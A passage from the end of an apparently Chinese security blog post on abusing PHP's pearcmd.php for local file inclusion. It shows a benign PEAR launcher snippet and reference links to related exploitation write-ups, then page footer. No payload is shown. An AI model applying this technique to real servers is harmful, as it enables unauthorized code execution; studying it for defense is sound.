+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
+<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
+<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
+<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/04/28/pearcmd.php/" title="利用pearcmd.php进行文件包含">https://fupanc.github.io/2024/04/28/pearcmd.php/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/" rel="prev" title="JWT以及jwt伪造">
+                  <i class="fa fa-angle-left"></i> JWT以及jwt伪造
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
